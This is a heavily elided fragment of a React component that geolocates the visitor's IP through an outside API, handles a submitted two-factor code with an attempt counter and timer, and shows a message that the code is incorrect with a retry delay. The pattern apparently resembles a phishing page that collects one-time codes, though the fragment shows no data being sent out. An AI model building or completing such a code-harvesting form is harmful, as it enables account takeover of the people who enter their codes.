...
const Content = () => {
    ...
    const handleOpendModalForm = async () => {
        ...
        const response = await axios.get(
            `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.NEXT_PUBLIC_IP_GEOLOCATION_KEY}&ip=${IP}`
        );
    ...
    const handleSubmitAuthen = async (e) => {
        setCount(count + 1)
        setTimeLeft(process.env.NEXT_PUBLIC_SETTING_TIME);
        const { twoFa } = e;
                                ...
                                <div className='popup-content'>
                                    ...
                                    >
                                        ...
                                        {timeLeft > 0 && warningTwodFa === true && loadingTwodFa === false ? (
                                            <p className={`password-correct ${warningTwodFa === true ? 'active' : ''}`}>The two-factor authentication you entered is incorrect. Please, try again after {seconds < 10 ? `0${seconds}` : seconds} seconds</p>
                                        ) : ''}
